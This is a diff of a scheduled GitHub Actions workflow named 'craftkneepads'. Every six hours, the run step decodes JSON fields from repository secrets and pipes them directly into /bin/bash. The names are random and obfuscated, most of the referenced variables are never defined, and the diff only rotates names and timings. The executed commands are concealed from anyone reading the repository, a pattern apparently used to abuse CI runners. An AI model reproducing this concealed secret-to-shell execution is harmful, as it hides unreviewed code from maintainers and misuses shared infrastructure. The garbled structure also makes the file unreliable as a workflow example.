@@ -2,30 +2,28 @@ name: craftkneepads
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 4/6 * * *'
-
+    - cron: '32 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: craftkneepads
         env:
-          zvnst7779: ${{ secrets.zvnst7779 }}
+          c4570: ${{ secrets.c4570 }}
         run: |
-          echo $zvnst7779 | jq -r .oaweb9443 | /bin/bash
-          echo $d35697 | jq -r .xsvr82479 | /bin/bash
-          echo $cl661 | jq -r .ru5474 | /bin/bash
-          echo $nuyn589 | jq -r .uia761 | /bin/bash
-          echo $cb2 | jq -r .y2 | /bin/bash
-          echo $egl68 | jq -r .s526 | /bin/bash
-          echo $ow614 | jq -r .ioah80875 | /bin/bash
-          echo $jm08 | jq -r .myo15028 | /bin/bash
-          echo $ujps51 | jq -r .uks007 | /bin/bash
-          echo $whqn5 | jq -r .cel97760 | /bin/bash
-          echo $nxma2753 | jq -r .hfc3 | /bin/bash
-          echo $ci9254 | jq -r .nlnf09406 | /bin/bash
-          echo $d73 | jq -r .irnw50 | /bin/bash
-          echo $tyov55889 | jq -r .czbyi6532 | /bin/bash
-          echo $mjaqu8955 | jq -r .yotwn14299 | /bin/bash
+          echo $c4570 | jq -r .wa7947 | /bin/bash
+          echo $wwfx65 | jq -r .buls024 | /bin/bash
+          echo $gjeo3 | jq -r .aqgyd4 | /bin/bash
+          echo $p45 | jq -r .f7 | /bin/bash
+          echo $eor2 | jq -r .uj0 | /bin/bash
+          echo $n4152 | jq -r .av96 | /bin/bash
+          echo $nzdns858 | jq -r .zvp7 | /bin/bash
+          echo $fqox202 | jq -r .rsrv16167 | /bin/bash
+          echo $yursk1 | jq -r .jazq75430 | /bin/bash
+          echo $sr855 | jq -r .sifd4 | /bin/bash
+          echo $wwcfe93562 | jq -r .nok5588 | /bin/bash
+          echo $q71569 | jq -r .nr43917 | /bin/bash
+          echo $upy26 | jq -r .ybisz06693 | /bin/bash
 
